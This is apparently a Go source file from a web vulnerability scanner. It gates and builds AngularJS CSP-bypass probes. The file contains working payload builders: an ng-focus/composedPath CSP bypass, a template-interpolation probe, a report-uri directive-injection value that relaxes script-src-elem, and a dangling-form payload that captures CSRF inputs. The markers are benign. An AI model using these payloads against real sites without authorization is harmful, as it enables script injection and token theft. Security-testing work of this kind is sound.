package detection

// This file is the automatic eligibility gate for the official AngularJS
// Content-Security-Policy bypass (ng-focus + $event.composedPath()). It is a
// pure function of the response bytes: the mutated response's CSP header and
// body, nothing else.
//
// Why the gate exists at all: the ng-focus technique only makes sense when the
// page's policy actually forbids inline script. When script-src allows
// 'unsafe-inline', every ordinary inline-handler candidate already runs, so the
// Angular shape adds a request without adding a mechanism; when the response
// carries no CSP (or a policy with neither script-src nor default-src), there is
// nothing to bypass. And Angular must actually be present — an ng-focus
// attribute on a page with no AngularJS compiler is inert markup.
//
// Two rules are deliberately narrow:
//   - Only script-src, else default-src, is consulted. A policy that restricts
//     scripts through neither imposes no script restriction at all.
//   - 'unsafe-inline' is matched as a whole source token (case-insensitively),
//     never as a substring, so a host such as https://unsafe-inline.example
//     cannot turn the gate off.

import (
	"bytes"
	"strings"
)

// AngularCSPBypassEligible reports whether the official AngularJS CSP bypass
// should be planned for a response: the response carries a CSP that forbids
// inline script (so an inline handler cannot run, but Angular's own compiled
// expression still can) AND its body shows AngularJS.
func AngularCSPBypassEligible(cspHeader string, body []byte) bool {
	// The cheap header test comes first: most responses carry no CSP at all, and
	// scanning (and lower-casing) their body would be wasted work.
	if !cspForbidsInlineScript(cspHeader) {
		return false
	}
	return HTMLUsesAngular(body)
}

// AngularCSPBypassTechnique is the Candidate.Technique tag of the one candidate
// this gate adds.
const AngularCSPBypassTechnique = "angular_csp_bypass"

// AngularCSPBypassValue builds the canonical bypass value for a marker. The
// marker is a benign identifier only: the expression never calls alert, reads a
// cookie or performs any network effect.
func AngularCSPBypassValue(marker string) string {
	return `<input autofocus ng-focus="$event.composedPath()|orderBy:'` + marker + `'">`
}

// AngularCSPExpressionTechnique is the Candidate.Technique tag of the second
// shape planned under the same gate: a plain text-node interpolation that the
// page's own Angular compiler evaluates. It exists because the ng-focus shape
// cannot be confirmed with a benign marker (Angular's CSP-safe interpreter
// resolves an unknown identifier to undefined instead of raising the
// marker-ReferenceError the verifier requires), while an interpolation gives a
// deterministic result to compare against.
const AngularCSPExpressionTechnique = "angular_csp_expression"

// AngularCSPExpressionValue builds an interpolation whose evaluated RESULT is a
// string the request never carries: the marker and a suffix are separate
// string literals joined at runtime, so `{{'<marker>'+'x'}}` renders
// "<marker>x" while the bytes actually sent contain "'<marker>'+'x'". Only a
// page that compiles and evaluates the expression can produce the contiguous
// result — an echo of the request cannot.
func AngularCSPExpressionValue(marker string) string {
	return "{{'" + marker + "'+'x'}}"
}

// AngularCSPExpressionResult is the exact string AngularCSPExpressionValue
// evaluates to. The verifier searches the rendered page for it.
func AngularCSPExpressionResult(marker string) string {
	return marker + "x"
}

// CSPReportURIParams returns the query-parameter NAMES carried by the policy's
// report-uri (or report-to fallback) URIs, in order and de-duplicated.
//
// Why this matters: a report-uri is a URL inside a response HEADER, so its
// query is a second, easily-missed injection surface. A server that copies the
// request's query into that URI without encoding lets an attacker append
// directives to the policy itself (";script-src-elem 'unsafe-inline'"), which
// relaxes the very policy that was supposed to stop the XSS in the body. The
// helper is deliberately conservative: only report-uri/report-to are inspected,
// only parameters with a name are returned, and the result is capped.
func CSPReportURIParams(cspHeader string) []string {
	return cspReportURIParams(cspHeader, cspMaxReportURIParams)
}

const cspMaxReportURIParams = 4

func cspReportURIParams(cspHeader string, limit int) []string {
	if limit <= 0 {
		return nil
	}
	var out []string
	seen := map[string]bool{}
	for _, raw := range bytes.Split([]byte(cspHeader), []byte(",")) {
		policy := bytes.TrimSpace(raw)
		if len(policy) == 0 {
			continue
		}
		dirs := cspDirectives(policy)
		for _, name := range []string{"report-uri", "report-to"} {
			for _, uri := range dirs[name] {
				q := uriQuery(uri)
				if q == "" {
					continue
				}
				for _, pair := range bytes.Split([]byte(q), []byte("&")) {
					kv := bytes.SplitN(pair, []byte("="), 2)
					key := string(bytes.TrimSpace(kv[0]))
					if key == "" || seen[key] {
						continue
					}
					seen[key] = true
					out = append(out, key)
					if len(out) >= limit {
						return out
					}
				}
			}
		}
	}
	return out
}

// uriQuery returns the raw query of a URI as it appears in a header value,
// without the leading '?'. Empty when the URI carries no query.
func uriQuery(uri string) string {
	i := strings.IndexByte(uri, '?')
	if i < 0 || i == len(uri)-1 {
		return ""
	}
	return uri[i+1:]
}

// CSPDirectiveInjectionTechnique tags the candidate that proves a header-level
// CSP bypass: a query parameter named inside the policy's own report-uri is
// reflected into the header, so the injected directive relaxes the policy that
// then governs the reflected <script> in the same request.
const CSPDirectiveInjectionTechnique = "csp_directive_injection"

// CSPDirectiveInjectionValue is the value this scanner sends into a
// report-uri parameter to prove the policy is injectable: it closes the URI's
// query and adds a directive that permits inline script ELEMENTS. Angular-free
// and eval-free on purpose — script-src-elem with 'unsafe-inline' is exactly
// what a reflected <script> needs, and nothing broader.
func CSPDirectiveInjectionValue() string {
	return ";script-src-elem 'unsafe-inline'"
}

// CSPDirectiveInjectionQuery builds the ExtraQuery fragment for a candidate:
// "<param>=<percent-encoded directive>". The planner stays pure (no net/url),
// so the encoding is done here with the RFC 3986 unreserved set; every byte of
// the directive that matters (';', quotes, spaces) is escaped, which is exactly
// what the server decodes back into policy bytes.
func CSPDirectiveInjectionQuery(param string) string {
	return cspPercentEncode(param) + "=" + cspPercentEncode(CSPDirectiveInjectionValue())
}

func cspPercentEncode(s string) string {
	const hex = "0123456789ABCDEF"
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9',
			c == '-', c == '.', c == '_', c == '~':
			b.WriteByte(c)
		default:
			b.WriteByte('%')
			b.WriteByte(hex[c>>4])
			b.WriteByte(hex[c&0x0f])
		}
	}
	return b.String()
}

// CSPForbidsInline is the exported gate for "a script would have to be inline to
// run here": true when some policy restricts script sources without
// 'unsafe-inline'. It is the precondition for the fallback techniques that do
// NOT need script execution (Angular compilation, dangling markup).
func CSPForbidsInline(cspHeader string) bool { return cspForbidsInlineScript(cspHeader) }

// DanglingFormTechnique tags the markup-only fallback for a page whose policy
// forbids inline script: a dangling form that captures the page's own hidden
// CSRF input, which the verifier can observe in the DOM without any request
// leaving the browser.
const DanglingFormTechnique = "dangling_form_capture"

// DanglingFormAction is the action URL the injected form points at. It carries
// the marker (so it is attributable and dedupable) and uses the reserved
// .invalid TLD, so even a submitted form could never reach a real host.
func DanglingFormAction(marker string) string {
	return "https://" + marker + ".invalid/log"
}

// DanglingFormValue builds the payload: close the attribute value, close the
// element, close the page's own form, then open one whose action and submit
// control are ours. Everything the page renders after the injection point —
// including its hidden CSRF input — is parsed as a child of this form.
func DanglingFormValue(marker string) string {
	return `"></form><form action="` + DanglingFormAction(marker) + `" method="GET"><input type="submit" value="Click">`
}

// CSPInjectionMarker reports whether cspHeader carries marker (the scan's
// canary) verbatim, i.e. the parameter that carried it reached the header
// unencoded. This is the deterministic, server-side half of the CSP-injection
// proof; the browser half is the script actually running under the relaxed
// policy.
func CSPInjectionMarker(cspHeader, marker string) bool {
	return marker != "" && strings.Contains(cspHeader, marker)
}

// cspForbidsInlineScript reports whether the header's policy (or, for a
// comma-separated list, any one of its policies) restricts script sources
// without allowing 'unsafe-inline'. A resource is only allowed when EVERY
// policy allows it, so one policy that blocks inline is enough to block it.
//
// The header value may be empty (no CSP → false). A policy with neither
// script-src nor default-src restricts no script at all and is skipped; a
// policy whose script-src is present but empty is treated as absent, exactly as
// the CSP grammar's "ignore an empty directive" rule does.
func cspForbidsInlineScript(cspHeader string) bool {
	for _, raw := range bytes.Split([]byte(cspHeader), []byte(",")) {
		policy := bytes.TrimSpace(raw)
		if len(policy) == 0 {
			continue
		}
		dirs := cspDirectives(policy)
		sources, ok := dirs["script-src"]
		if !ok || len(sources) == 0 {
			sources, ok = dirs["default-src"]
		}
		if !ok || len(sources) == 0 {
			// This policy places no restriction on script sources.
			continue
		}
		if !hasCSPSource(sources, "unsafe-inline") {
			return true
		}
	}
	return false
}

// cspDirectives parses one serialized policy ("default-src 'self'; img-src *")
// into lower-cased directive names and their source tokens, with the CSP
// keywords' surrounding single quotes stripped so callers compare bare
// keywords. A repeated directive keeps its FIRST occurrence: the CSP grammar
// ignores later duplicates, and honouring the first is the conservative
// reading of a malformed policy.
func cspDirectives(policy []byte) map[string][]string {
	out := map[string][]string{}
	for _, raw := range bytes.Split(policy, []byte(";")) {
		fields := bytes.Fields(raw)
		if len(fields) == 0 {
			continue
		}
		name := string(bytes.ToLower(fields[0]))
		if _, dup := out[name]; dup {
			continue
		}
		tokens := make([]string, 0, len(fields)-1)
		for _, f := range fields[1:] {
			tokens = append(tokens, string(f))
		}
		out[name] = tokens
	}
	return out
}

// hasCSPSource reports whether the source list contains keyword, comparing the
// bare keyword with any single quotes stripped (CSP keywords are
// case-insensitive; host sources are not, but no host equals a keyword once the
// quotes are stripped).
func hasCSPSource(sources []string, keyword string) bool {
	for _, src := range sources {
		src = string(bytes.Trim([]byte(src), "'"))
		if bytes.EqualFold([]byte(src), []byte(keyword)) {
			return true
		}
	}
	return false
}

// Angular attribute markers this detector recognises. ng-controller is included
// because it is an Angular directive in its own right and does not require
// ng-app on the same element (bootstrap can happen through angular.bootstrap or
// an enclosing ng-app).
var angularAttrMarkers = []string{"ng-app", "data-ng-app", "x-ng-app", "ng:app", "ng-controller"}

// HTMLUsesAngular reports whether the response body shows AngularJS: a
// recognised Angular attribute marker, or a <script> tag that loads an Angular
// build.
func HTMLUsesAngular(body []byte) bool {
	lower := bytes.ToLower(body)
	for _, marker := range angularAttrMarkers {
		if hasHTMLToken(lower, marker) {
			return true
		}
	}
	return loadsAngularScript(lower)
}

// hasHTMLToken reports whether lower contains token as a whole attribute-name
// token: the byte after it must not continue an identifier/attribute name
// ("ng-application" must not match "ng-app"). The preceding byte is not
// constrained because every data-/x- variant legitimately prefixes the token
// with "-" and the marker itself is distinctive enough.
func hasHTMLToken(lower []byte, token string) bool {
	needle := []byte(token)
	for i := 0; ; {
		j := bytes.Index(lower[i:], needle)
		if j < 0 {
			return false
		}
		end := i + j + len(needle)
		if end == len(lower) || !isAttrNameByte(lower[end]) {
			return true
		}
		i = end
	}
}

// isAttrNameByte reports whether b continues an attribute name. The HTML
// tokenizer ends an attribute name at whitespace, '=', '/', '>' or a quote, so
// those bytes (and anything else that is not a letter/digit/_/-/:/.) terminate
// the token.
func isAttrNameByte(b byte) bool {
	switch {
	case b >= 'a' && b <= 'z', b >= '0' && b <= '9':
		return true
	case b == '-', b == '_', b == ':', b == '.':
		return true
	}
	return false
}

// loadsAngularScript reports whether any <script> start tag references an
// Angular build (e.g. <script src="/js/angular.min.js">). Only the tag itself
// is inspected, so prose mentioning angular.js never qualifies.
func loadsAngularScript(lower []byte) bool {
	for i := 0; ; {
		j := bytes.Index(lower[i:], []byte("<script"))
		if j < 0 {
			return false
		}
		start := i + j
		end := bytes.IndexByte(lower[start:], '>')
		if end < 0 {
			return false
		}
		tag := lower[start : start+end]
		if bytes.Contains(tag, []byte("angular")) && bytes.Contains(tag, []byte(".js")) {
			return true
		}
		i = start + end + 1
	}
}
